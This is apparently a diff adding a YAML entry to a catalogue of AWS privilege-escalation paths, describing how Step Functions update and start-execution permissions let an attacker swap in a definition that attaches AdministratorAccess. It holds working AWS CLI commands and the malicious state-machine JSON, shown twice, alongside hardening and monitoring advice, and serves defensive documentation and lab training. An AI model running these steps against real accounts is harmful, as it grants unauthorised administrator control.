@@ -1,0 +1,216 @@
+id: stepfunctions-002
+name: states:UpdateStateMachine + states:StartExecution
+category: existing-passrole
+services:
+  - iam
+  - stepfunctions
+
+permissions:
+  required:
+    - permission: states:UpdateStateMachine
+      resourceConstraints: Must have access to the target state machine ARN
+    - permission: states:StartExecution
+      resourceConstraints: Must have access to the target state machine ARN
+  additional:
+    - permission: states:ListStateMachines
+      resourceConstraints: Helpful for discovering state machines to target
+    - permission: states:DescribeStateMachine
+      resourceConstraints: Useful for viewing the current definition and role ARN of a target state machine
+    - permission: states:ListExecutions
+      resourceConstraints: Helpful for monitoring execution history
+    - permission: states:DescribeExecution
+      resourceConstraints: Useful for polling execution status
+
+description: A principal with `states:UpdateStateMachine` and `states:StartExecution` can replace the ASL definition of an existing Step Functions state machine that already has an admin IAM role attached. The attacker supplies a malicious ASL definition using a Step Functions SDK integration that calls `iam:AttachUserPolicy`, then starts a new execution. No `iam:PassRole` is required because the admin role was already assigned to the state machine — `states:UpdateStateMachine` updates only the definition, not the role.
+
+prerequisites:
+  admin:
+    - An existing Step Functions state machine must already have an admin IAM role attached as its execution role
+  lateral:
+    - An existing Step Functions state machine must have an elevated IAM role attached as its execution role
+
+exploitationSteps:
+  awscli:
+    - step: 1
+      command: |
+        aws stepfunctions list-state-machines \
+          --query 'stateMachines[*].{name:name,arn:stateMachineArn}' \
+          --output table
+      description: Enumerate existing state machines to identify targets with privileged execution roles attached.
+    - step: 2
+      command: |
+        aws stepfunctions describe-state-machine \
+          --state-machine-arn STATE_MACHINE_ARN \
+          --query '{roleArn:roleArn,status:status}' \
+          --output json
+      description: Inspect the target state machine to confirm it has a privileged role and is in an ACTIVE state.
+    - step: 3
+      command: |
+        cat > /tmp/sfn-malicious-def.json << 'EOF'
+        {
+          "Comment": "Privilege escalation via existing state machine role",
+          "StartAt": "AttachAdmin",
+          "States": {
+            "AttachAdmin": {
+              "Type": "Task",
+              "Resource": "arn:aws:states:::aws-sdk:iam:attachUserPolicy",
+              "Parameters": {
+                "UserName": "STARTING_USER",
+                "PolicyArn": "arn:aws:iam::aws:policy/AdministratorAccess"
+              },
+              "End": true
+            }
+          }
+        }
+        EOF
+
+        aws stepfunctions update-state-machine \
+          --state-machine-arn STATE_MACHINE_ARN \
+          --definition file:///tmp/sfn-malicious-def.json
+      description: Replace the state machine's definition with malicious ASL that calls iam:AttachUserPolicy. The existing admin role is preserved — no iam:PassRole required.
+    - step: 4
+      command: |
+        aws stepfunctions start-execution \
+          --state-machine-arn STATE_MACHINE_ARN
+      description: Execute the now-malicious state machine. It runs under the pre-existing admin role and attaches AdministratorAccess to the starting user.
+
+recommendation: |
+  - **Restrict `states:UpdateStateMachine`** - This permission allows arbitrary modification of state machine definitions, including swapping in malicious ASL that abuses the machine's existing role. Only trusted CI/CD principals should have this permission.
+  - **Audit state machines for privileged execution roles** - Any state machine with an administrative role is a persistent escalation vector for anyone with `states:UpdateStateMachine`. Regularly review and down-scope state machine roles.
+  - **Apply least privilege to state machine roles** - Scope state machine execution roles to only the specific AWS APIs the state machine legitimately calls. An admin-scoped state machine role is a standing risk.
+  - Monitor CloudTrail for `states:UpdateStateMachine` calls, especially those that change the state machine definition
+  - Monitor CloudTrail for state machine definitions containing SDK integration tasks that call sensitive IAM APIs
+  - Alert on IAM policy attachment events (`iam:AttachUserPolicy`, `iam:AttachRolePolicy`) originating from Step Functions execution roles
+  - Implement AWS Config rules to detect state machines with overly permissive execution roles
+
+discoveryAttribution:
+  firstDocumented:
+    author: Zander Mackie
+    organization: Datadog
+    date: "2025"
+
+references:
+  - title: "Actions defined by AWS Step Functions - Service Authorization Reference"
+    url: "https://docs.aws.amazon.com/service-authorization/latest/reference/list_awsstepfunctions.html"
+  - title: "Creating an IAM role for your state machine - AWS Step Functions"
+    url: "https://docs.aws.amazon.com/step-functions/latest/dg/procedure-create-iam-role.html"
+
+relatedPaths:
+  - stepfunctions-001
+
+learningEnvironments:
+  pathfinding-labs:
+    type: open-source
+    githubLink: https://github.com/DataDog/pathfinding-labs
+    scenario: "privesc-one-hop/to-admin/stepfunctions-002-states-updatestatemachine+states-startexecution"
+    description: "Deploy Terraform scenarios individually or in groups, each with attack and cleanup scripts"
+attackVisualization:
+  nodes:
+    - id: start
+      label: Starting Principal
+      type: principal
+      description: The principal with `states:UpdateStateMachine` and `states:StartExecution` permissions. No `iam:PassRole` is required — the admin role is already attached to the target state machine.
+
+    - id: existing_sfn
+      label: Existing State Machine (pre-attached admin role)
+      type: resource
+      description: |
+        An existing Step Functions state machine that already has an admin IAM role attached as its execution role. The attacker replaces only the ASL definition — the role remains unchanged. This is the key distinction from stepfunctions-001: no `iam:PassRole` is needed because the attacker is not assigning a new role, only modifying the workflow definition.
+
+        The attacker first enumerates state machines and inspects their attached roles:
+        ```bash
+        aws stepfunctions list-state-machines \
+          --query 'stateMachines[*].{name:name,arn:stateMachineArn}' \
+          --output table
+
+        aws stepfunctions describe-state-machine \
+          --state-machine-arn STATE_MACHINE_ARN \
+          --query '{roleArn:roleArn,status:status}' \
+          --output json
+        ```
+
+    - id: admin_role
+      label: Pre-existing Admin Role
+      type: principal
+      description: The IAM role already attached to the target state machine. It trusts `states.amazonaws.com` and has administrative or elevated permissions. Because `states:UpdateStateMachine` does not modify the role assignment, this role is preserved when the attacker swaps in the malicious definition. All subsequent executions run under this role.
+
+    - id: admin_outcome
+      label: Effective Administrator
+      type: outcome
+      description: The pre-existing role has AdministratorAccess or equivalent permissions. The malicious ASL definition's `iam:AttachUserPolicy` SDK integration call succeeds, attaching AdministratorAccess to the starting user.
+
+    - id: some_perms
+      label: Some additional access
+      type: outcome
+      color: '#ffeb99'
+      description: The pre-existing role has elevated permissions but not full admin. The attacker can craft ASL definitions leveraging whatever the role can do — reading secrets, accessing S3, interacting with other services — but cannot directly grant themselves administrator access.
+
+    - id: no_perms
+      label: No additional access
+      type: outcome
+      color: '#cccccc'
+      description: The pre-existing role has only minimal permissions. Replacing the state machine definition and executing it provides no meaningful escalation.
+
+  edges:
+    - from: start
+      to: existing_sfn
+      label: states:UpdateStateMachine + states:StartExecution
+      description: |
+        Replace the existing state machine's ASL definition with a malicious one, then start an execution. The existing role is preserved throughout — no `iam:PassRole` is exercised.
+
+        Step 1 — Write the malicious ASL definition and update the state machine:
+        ```bash
+        cat > /tmp/sfn-malicious-def.json << 'EOF'
+        {
+          "Comment": "Privilege escalation via existing state machine role",
+          "StartAt": "AttachAdmin",
+          "States": {
+            "AttachAdmin": {
+              "Type": "Task",
+              "Resource": "arn:aws:states:::aws-sdk:iam:attachUserPolicy",
+              "Parameters": {
+                "UserName": "STARTING_USER",
+                "PolicyArn": "arn:aws:iam::aws:policy/AdministratorAccess"
+              },
+              "End": true
+            }
+          }
+        }
+        EOF
+
+        aws stepfunctions update-state-machine \
+          --state-machine-arn STATE_MACHINE_ARN \
+          --definition file:///tmp/sfn-malicious-def.json
+        ```
+
+        Step 2 — Start an execution:
+        ```bash
+        aws stepfunctions start-execution \
+          --state-machine-arn STATE_MACHINE_ARN
+        ```
+
+    - from: existing_sfn
+      to: admin_role
+      label: State machine runs with pre-existing admin role
+      description: Step Functions executes the (now malicious) definition using the role that was already attached to the state machine before the attacker arrived. The SDK integration call in the ASL is made as this pre-existing admin role, giving it the role's full permissions.
+
+    - from: admin_role
+      to: admin_outcome
+      label: If role has admin or IAM write permissions
+      branch: A
+      condition: admin
+      description: If the pre-existing role has AdministratorAccess or at minimum `iam:AttachUserPolicy`, the SDK integration call succeeds and AdministratorAccess is attached to the starting user.
+
+    - from: admin_role
+      to: some_perms
+      label: If role has some elevated permissions
+      branch: B
+      condition: some_permissions
+      description: If the pre-existing role has elevated permissions but lacks IAM write access, the attacker can adjust the malicious ASL to call APIs the role does have access to, achieving partial escalation or data access.
+
+    - from: admin_role
+      to: no_perms
+      label: If role has minimal permissions
+      branch: C
+      condition: no_permissions
+      description: If the pre-existing role has only minimal permissions, the replaced definition cannot perform useful actions regardless of what SDK integrations the attacker includes.
